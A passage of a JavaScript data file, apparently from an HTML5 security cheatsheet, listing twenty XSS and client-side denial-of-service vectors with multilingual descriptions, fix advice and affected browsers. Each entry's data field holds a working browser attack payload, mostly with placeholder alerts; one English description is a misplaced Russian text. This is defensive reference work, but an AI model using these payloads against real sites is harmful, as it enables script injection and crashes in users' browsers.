/* Items - the set of available items and vectors */
var items = 
[
    { /* ID 1 - XSS via formaction - requiring user interaction (1) */
        'id'         : 1, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'XSS via formaction - requiring user interaction (1)',
            'ja' : 'formaction\u7d4c\u7531\u3067\u306eXSS - \u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u304c\u5fc5\u8981',
            'ru' : 'Пассивный скриптинг через formaction (1)',
            'de' : ''
        },
        'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
        'description': {
            'en' : 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
            'ja' : 'HTML5\u306eform\u3068formaction\u6a5f\u80fd\u3092\u4f7f\u3063\u3066\u65e2\u5b58\u306eform\u3092\u5916\u5074\u304b\u3089\u4e57\u3063\u53d6\u308b\u624b\u6cd5',
            'ru' : 'Вектор демонстрирует возможности HTML 5 атрибутов "form" и "formaction" по захвату внешней формы.',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes. Avoid "id" attributes for forms as well as submit buttons.',
	    'ja' : '\u0022form\u0022\u3068\u0022formaction\u0022\u5c5e\u6027\u3092\u542b\u3080\u8981\u7d20\u3092\u30e6\u30fc\u30b6\u306b\u5165\u529b\u3055\u305b\u306a\u3044\u3001\u3042\u308b\u3044\u306f\u305d\u308c\u3089\u306e\u5c5e\u6027\u3092\u7121\u52b9\u306a\u5024\u306b\u5909\u63db\u3059\u308b\u3053\u3068\u3002\u0022id\u0022\u5c5e\u6027\u306fform\u3060\u3051\u3067\u306a\u304fsubmit\u30dc\u30bf\u30f3\u306b\u3064\u3044\u3066\u3082\u5bfe\u5fdc\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Не разрешайте пользовательскую разметку, содержащую атрибуты "form" и "formaction" или неправильные значения этих атрибутов. Избегайте атрибут "id" в формах, как и элементы ввода submit типа.',
            'de' : ''
        },
        'browsers'   : {
            'opera': ['10.5', '10.6', 'mobile']
        },
        'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
        'reporter'   : '.mario'
    },
    { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
        'id'         : 2, 
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via x-imap4-modified-utf7 (1)',
            'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (1)',
            'ru' : 'XSS с использованием x-imap4-modified-utf7 (1)',
            'de' : ''
        },
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
        'description': {
            'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
            'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
            'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
            'de' : ''
        },
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'utf7', 'firefox', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 3 - XSS via x-imap4-modified-utf7 (2) */
        'id'         : 3, 
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via x-imap4-modified-utf7 (2)',
            'ja' : 'x-imap4-modified-utf7\u3092\u5229\u7528\u3057\u305fXSS (2)',
            'ru' : 'XSS с использованием x-imap4-modified-utf7 (2)',
            'de' : ''
        },
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
        'description': {
            'en' : 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
            'ja' : '\u3053\u306e\u653b\u6483\u624b\u6cd5\u306f\u3001\u691c\u51fa\u304c\u975e\u5e38\u306b\u56f0\u96e3\u306a\u3001\u98a8\u5909\u308f\u308a\u306acharset\u306b\u3088\u308bXSS\u306e\u624b\u6bb5\u3068\u306a\u308a\u5f97\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002',
            'ru' : 'Этот вектор показывает, как ответвление кодировки UTF7 может быть использовано для создания очень труднообнаружимых XSS векторов.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure no <META> tags can be injected and the website is delivered with a charset.',
            'ja' : '\u653b\u6483\u8005\u306b\u3088\u308b\u003cmeta\u003e\u8981\u7d20\u306e\u633f\u5165\u304c\u4e0d\u53ef\u80fd\u306a\u3053\u3068\u3001web\u30b5\u30a4\u30c8\u304ccharset\u3092\u6b63\u3057\u304f\u9001\u51fa\u3057\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Убедитесь, что тег <META> не может быть внедрен и страницы сайта отправляются с указанием кодировки.',
            'de' : ''
        },          
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'utf7', 'firefox', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 4 - Self-including DOM Worker XSS */
        'id'         : 4, 
        'category'   : 'dom', 
        'name'       : {
            'en' : 'Self-including DOM Worker XSS',
            'ja' : '',
            'ru' : 'Скриптинг в DOM с помощью объекта Worker.',
            'de' : ''
        },
        'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
        'description': {
            'en' : 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
            'ja' : '\u30b9\u30af\u30ea\u30d7\u30c8\u306e\u5b9f\u884c\u306b DOM workers \u3068 message \u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u3001\u81ea\u8eab\u3092 include \u3059\u308b\u30b3\u30fc\u30c9',
            'ru' : 'Исполнение кода происходит благодаря отсылке javascript-сообщения методом postMessage и приёму его на той же странице объектом Worker, к обработчику события onmessage которого привязана функция, запускающая метод eval.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/En/Using_web_workers'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'firefox': [
                '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'worker', 'self-inclusion'],
        'reporter'   : '.mario'
    },
    { /* ID 5 - Firefox crypto object - hidden eval() */
        'id'         : 5, 
        'category'   : 'dom', 
        'name'       : {
            'en' : 'Firefox crypto object - hidden eval()',
            'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8 - \u96a0\u308c\u305f eval()',
            'ru' : 'Объект crypto в Firefox - скрытый eval()',
            'de' : ''
        },
        'data'       : '<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')</script>',
        'description': {
            'en' : 'This vector uncovers a hidden eval() inside the Firefox crypto object',
            'ja' : 'Firefox crypto \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u5185\u306b\u96a0\u3055\u308c\u305f eval\u0028\u0029 \u6a5f\u80fd\u3067\u3059\u3002',
            'ru' : 'Этот вектор срывает покровы с объекта crypto в Firefox, выявляя внутри него скрытый eval().',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/JavaScript_crypto'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'firefox': [
                '2.x', '3.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'crypto', 'eval', 'csp', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 6 - Firefox setter based JavaScript execution */
        'id'         : 6, 
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'Firefox setter based JavaScript execution',
            'ja' : 'Firefox\u306esetter\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
            'ru' : 'Исполнение кода в Firefox с использованием setter',
            'de' : ''
        },
        'data'       : '<script>({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%</script>',
        'description': {
            'en' : 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
            'ja' : 'Gecko\u002fFirefox\u306esetter\u306b\u3088\u308b\u62ec\u5f27\u3092\u4f7f\u308f\u306a\u3044JavaScript\u306e\u5b9f\u884c',
            'ru' : 'Применение setter`ов в Gecko/Firefox для выполнения JavaScript без использования круглых скобок.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'firefox': [
                '1.x', '2.x', '3.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'firefox', 'setter', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 7 - Self-executing focus event via autofocus */
        'id'         : 7, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing focus event via autofocus',
            'ja' : 'autofocus\u306b\u3088\u308bfocus\u30a4\u30d9\u30f3\u30c8\u3092\u5229\u7528\u3057\u305f\u81ea\u5df1\u5b9f\u884c',
            'ru' : 'Автофокусировка как способ автоматического исполнения кода',
            'de' : ''
        },
        'data'       : '<input onfocus=%js_write% autofocus>',
        'description': {
            'en' : 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
            'ja' : 'autofocus \u5c5e\u6027\u3092\u6301\u3064 input \u8981\u7d20\u3092\u4f7f\u3063\u3066\u81ea\u8eab\u306efocus\u30a4\u30d9\u30f3\u30c8\u306e\u30cf\u30f3\u30c9\u30e9\u3092\u547c\u3073\u51fa\u3059\u624b\u6cd5\u3002\u30e6\u30fc\u30b6\u306e\u4ecb\u5728\u306f\u4e0d\u8981\u3002',
            'ru' : 'Этот вектор использует элемент input с атрибутом autofocus, чтобы вызвать свой собственный обработчик события фокусировки без взаимодействия с пользователем.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.', 
	    'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Пользовательская разметка не должна содержать атрибут "autofocus".',
            'de' : ''
        },          
        'browsers'   : {
            'opera': ['10.5', '10.6'],
            'safari' : ['4.0'],
            'chrome': ['4.0', '5.0', '6.0']
        },
        'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
        'reporter'   : 'Gareth'
    },
    { /* ID 8 - Self-executing blur event via autofocus competition */
        'id'         : 8, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing blur event via autofocus competition',
            'ja' : 'blur\u30a4\u30d9\u30f3\u30c8\u306b\u3088\u308bautofocus\u306e\u596a\u3044\u5408\u3044\u306b\u3088\u308b\u81ea\u5df1\u5b9f\u884c',
            'ru' : 'Потеря фокуса, инициированная фокусировкой на другом элементе, как способ автоматического исполнения кода.',
            'de' : ''
        },
        'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
        'description': {
            'en' : 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
            'ja' : '\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u596a\u3044\u5408\u30462\u3064\u306einput\u8981\u7d20\u304c\u3042\u308a\u3001\u4e00\u65b9\u304c\u30d5\u30a9\u30fc\u30ab\u30b9\u3092\u5931\u3063\u305f\u5834\u5408\u306bJavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\u3002',
            'ru' : 'В этом примере мы видим два элемента input, конкурирующих за фокус, и один из них исполняет JavaScript при потере им фокуса.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602','http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#autofocusing-a-form-control'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.',
            'ja' : '\u30e6\u30fc\u30b6\u306e\u5165\u529b\u3057\u305fHTML\u65ad\u7247\u306b \u0022autofocus\u0022 \u5c5e\u6027\u304c\u542b\u307e\u308c\u306a\u3044\u3088\u3046\u306b\u3059\u308b\u3053\u3068\u3002',
            'ru' : 'Пользовательская разметка не должна содержать атрибут "autofocus".',
            'de' : ''
        },    
        'browsers'   : {
            'safari' : ['4.0'],
            'chrome': [
                '4.0', '5.0', '6.0'
            ]
        },
        'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 9 - Opera link-source JavaScript execution via CSS */
        'id'         : 9, 
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera link-source JavaScript execution via CSS',
            'ja' : 'CSS\u7d4c\u7531\u306eOpera link\u30bd\u30fc\u30b9\u306b\u3088\u308bJavaScript\u306e\u5b9f\u884c',
            'ru' : 'Исполнение Javascript в Opera с помощью CSS-свойства link-source',
            'de' : ''
        },
        'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
        'description': {
            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
            'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
            'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-элементов, делать их интерактивными и пригодными для внедрения JavaScript.',
            'de' : ''
        },
        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'opera': [
                '8.0', '9.0', '10.x', 'mobile'
            ]
        },
        'tags'       : ['xss', 'css', 'link-source', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 10 - JavaScript execution via <VIDEO> poster attribute  */
        'id'         : 10, 
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> poster attribute',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью атрибута poster тега <VIDEO>',
            'de' : ''
        },
        'data'       : '<video poster=%js_uri_alert%//',
        'description': {
            'en' : 'Opera 10.5+ allows using poster attrubtes in combination with javascript: URIs',
            'ja' : '',
            'ru' : 'Opera 10.5+ поддерживает атрибут poster в сочетании с псевдоскриптом.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure only relative URIs, http URIs and correctly MIME-typed data URIs can be used for VIDEO poster attribuites',
            'ja' : '',
            'ru' : 'Убедитесь, что для атрибута poster допускаются только относительные URI, http URI и правильные MIME типы для data:URI .',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['10.5', '10.6']
        },
        'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
        'reporter'   : '.mario'
    },
    { /* ID 11 - SVG executing JavaScript via <G> tag and onload attribute  */
        'id'         : 11, 
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG executing JavaScript via <G> tag and onload attribute',
            'ja' : '',
            'ru' : 'Исполнение Javascript в SVG с помощью элемента <G> и атрибута onload',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><g onload="%js_uri_alert%"></g></svg>',
        'description': {
            'en' : 'SVG files can execute JavaScript via onload events on any element without user interaction',
            'ja' : '',
            'ru' : 'SVG файлы могут исполнять JavaScript с помощью обработчиков onload в любых элементах без взаимодействия с пользователем.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/SVG'],
        'howtofix'   : {
            'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
            'ja' : '',
            'ru' : 'SVG файлы не должны рассматриваться в качестве изображений - особенно, когда дело касается загрузки. SVG файл может содержать произвольные данные HTML, а также обработчики событий в собственных элементах.',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.0', '10.5', '10.6'],
            'chrome': [
                '4.0', '5.0', '6.0'
            ],
            'firefox': [
                '3.0', '3.5', '3.6', '3.7'
            ]            
        },
        'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
        'reporter'   : '.mario'
    },
    { /* ID 12 - Self-executing JavaScript via <BODY> onscroll autofocus */
        'id'         : 12,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Self-executing JavaScript via <BODY> onscroll autofocus',
            'ja' : '',
            'ru' : 'Самовыполнение JavaScript с помощью обрабочкика onscroll тега <BODY> и autofocus',
            'de' : ''
        },
        'data'       : '<body onscroll=%js_alert%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
        'description': {
            'en' : 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
            'ja' : '',
            'ru' : 'В этом векторе исполнение JavaScript достигается путем искусственного вызова события scroll (прокрутка страницы) тега <BODY>, происходящем из-за автофокусировки на теге <INPUT> в конце страницы.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'opera': ['10.5', '10.6'],
            'safari' : ['4.0'],
            'chrome': [
                '4.0', '5.0', '6.0'
            ]
        },
        'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 13 - Client-side denial of service via repeat templates */
        'id'         : 13,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Client-side denial of service via repeat templates',
            'ja' : '',
            'ru' : 'Отказ в обслуживании со стороны клиента с помощью повторяющихся шаблонов',
            'de' : ''
        },
        'data'       : '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
        'description': {
            'en' : 'This vector uses the repeat template syntax specifies in the WebForms 2.0 draft. By using nested tags repeating themselves all over again the client can be forced to deny service or even crash.',
            'ja' : '',
            'ru' : 'Этот вектор использует синтаксис повторящихся шаблонов, определенный в черновике WebForms 2.0. При использовании вложенных тегов повторения могут провоцировать отказ в обслуживании или даже аварийное завершение работы клиента.',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls'],
        'howtofix'   : {
            'en' : 'Avoid allowing users submitting HTML containing repeat or "repeat-start"/"repeat-end" attributes. If necessary validate the numerical values used for them to be reasonably small.',
            'ja' : '',
            'ru' : 'Не позволяйте пользовательскую HTML разметку , содержащую атрибуты repeat или repeat-start/repeat-end. При необходимости проверяйте, чтобы используемые в них численные значения были относительно невелики.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['10.0']
        },
        'tags'       : ['dos', 'repeat', 'template', 'webforms', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 14 - Client-side denial of service via faulty regular expressions */
        'id'         : 14,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Client-side denial of service via faulty regular expressions',
            'ja' : '',
            'ru' : 'Отказ в обслуживании со стороны клиента с помощью неправильного регулярного выражения',
            'de' : ''
        },
        'data'       : '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
        'description': {
            'en' : 'Opera 10 allows client side validation via the pattern attribute. In case the pattern value is a badly written regex the client can be "dossed" with short customized character sequences.',
            'ja' : '',
            'ru' : 'Opera 10 поддерживает проверку правильности пользовательского ввода с помощью атрибута pattern. В случае, если параметр pattern является ошибочно написанным регулярным выражением, это может вызвать отказ в обслуживании с клиентской стороны.',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute', 'http://en.wikipedia.org/wiki/Regular_expression_Denial_of_Service_-_ReDoS'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit HTML containing "pattern" attributes and make sure your own client side regular expressions used for validation are well written and not vulnerable against easy ReDoS attacks.',
            'ja' : '',
            'ru' : 'Не позволяйте пользовательскую HTML разметку , содержащую атрибут pattern и убедитесь, что ваши собственные клиентские регулярные выражения коректно написаны и неуязвимы для ReDoS атак.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['10.0']
        },
        'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 15 - JavaScript execution via sharp variables */
        'id'         : 15,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via sharp variables',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью диез-переменных',
            'de' : ''
        },
        'data'       : '<script>({0:#0=%js_alert_only%/#0#/#0#(0)})</script>',
        'description': {
            'en' : 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
            'ja' : '',
            'ru' : 'Этот вектор демонстриует использование диез-переменных (sharp variables) и циклических ссылок для обфускации фактического вызова метода.',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/Sharp_variables_in_JavaScript'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },          
        'browsers'   : {
            'firefox': ['2.x', '3.0', '3.5', '3.6', '3.7']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'sharp', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 16 - Using onbegin and HTML+TIME to execute JavaScript */
        'id'         : 16,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Using onbegin and HTML+TIME to execute JavaScript',
            'ja' : '',
            'ru' : 'Использование onbegin и HTML+TIME для вызова JavaScript',
            'de' : ''
        },
        'data'       : 'X<x style=`behavior:url(#default#time2)` onbegin=`%js_write%` >',
        'description': {
            'en' : 'The HTML+TIME behavior allows to use arbitrary tags to execute JavaScript via onbegin event handlers.',
            'ja' : '',
            'ru' : 'Поведение HTML+TIME позволяет достичь исполнения JavaScript в произвольном теге с помощью обработчика события onbegin.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
            'ja' : '',
            'ru' : 'Не позволяйте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Достаточно нераспространенные HTML+TIME API предоставляют слишком много экзотических способов исполнения JavaScript без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'onbegin'],
        'reporter'   : '.mario'
    },
    { /* ID 17 - Opera XML-stylesheets executing JavaScript */
        'id'         : 17,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera XML-stylesheets executing JavaScript',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью XML-таблицы стилей в Opera ',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet href="%js_uri_alert%"?>',
        'description': {
            'en' : 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and executes the JavaScript afterwards without user interaction. The vectors even works if the page is delivered as text/html.',
            'ja' : '',
            'ru' : 'Opera 9.x и 10,0 позволяет применять XML-таблицы стилей с псевдоскриптом, который в дальнейшем выполняется без взаимодействия с пользователем. Вектор работает, даже если страница отправляется как text/html.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure that user input cannot contain XML stylesheets or tags not consisting of <\\w+ - because this vector would only be matched via <\\?\\w+ but still executes JavaScript without user interaction. Avoid blacklists is possible.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательская разметка не может содержать XML-таблицы и теги, не состоящие из <\\w+ - потому что этот вектор будет соответствовать только <\\?\\w+ . Избегайте черных списков, если это возможно.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['9.x', '10.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 18 - Entities inside <SCRIPT> and comparable tags */
        'id'         : 18,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Entities inside <SCRIPT> and comparable tags',
            'ja' : '',
            'ru' : 'HTML-эквиваленты внутри <SCRIPT> и аналогичных тегов',
            'de' : ''
        },
        'data'       : '<script>%js_alert_entities%</script>',
        'description': {
            'en' : 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and rendered as X(HT)ML.',
            'ja' : '',
            'ru' : 'Согласно спецификации пользовательским агентам разрешено распознавать HTML-эквиваленты внутри тегов <SCRIPT> и <STYLE> в случае, если документ отдается и обрабатывается как X(HT)ML.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure filters and detection systems consider the fact of having entities to be allowed inbetween <SCRIPT>, <STYLE> and other tags - and not only in attributes.',
            'ja' : '',
            'ru' : 'Убедитесь, что фильтры и системы обнаружения учитывают возможность наличия HTML-эквивалентов внутри тегов <SCRIPT>, <STYLE> и других, а не только в атрибутах.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : '.mario'
    },
    { /* ID 19 - XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew */
        'id'         : 19,
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew',
            'ja' : '',
            'ru' : 'XSS c использованием &#188 and &#190 в кодировках MacFarsi, MacArabic and MacHebrew',
            'de' : ''
        },
        'data'       : '<meta charset="mac-farsi">\xBCscript\xBE%js_alert%\xBC/script\xBE',
        'description': {
            'en' : 'Согласно спецификации пользовательским агентам разрешено распознавать HTML-эквиваленты внутри тегов <SCRIPT> и <STYLE> в случае, если документ отдается и обрабатывается как X(HT)ML.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'User input should never allow <META> tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure to have your filter be aware that for Firefox &#60; (<) and &#188; are equivalent - as well as other characters too.',
            'ja' : '',
            'ru' : 'Пользовательскому вводу никогда не должен быть разрешен тег <МЕТА> во избежание переопределения кодировки. В случае, если веб-сайт кодируется в одной из указанных кодировок, убедитесь, что вашему фильтру известно, что для Firefox символы &#60; (<) и &#188; эквивалентны, аналогично и в отношении других сиволов.',
            'de' : ''
        },            
        'browsers'   : {
            'firefox' : ['2.x', '3.x', '3.5', '3.6', '3.7']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : 'hasegawayosuke'
    },
    { /* ID 20 - JavaScript execution via overwritten ReferenceError object */
        'id'         : 20,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via overwritten ReferenceError object',
            'ja' : '',
            'ru' : 'Исполнение JavaScript через переопределение объекта ReferenceError',
            'de' : ''
        },
        'data'       : '<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){%js_alert%}),x</script>',
        'description': {
            'en' : 'This JavaScript vector shows how overwriting the ReferenceError object and causing the exact same kind of error afterwards can lead to JavaScript execution. This is of course the same for most other error objects and should be taken into consideration when implementing JavaScript sandboxes or comparable.',
            'ja' : '',
            'ru' : 'Этот JavaScript-вектор показывает, как переопределяя объект ReferenceError и вызывая такого же рода ошибку впоследствии, можно вызвать выполнение JavaScript. Это, разумеется, действительно для большинства других объектов ошибкок и должнo приниматься во внимание при разработке JavaScript-песочниц и т.п.',
            'de' : ''
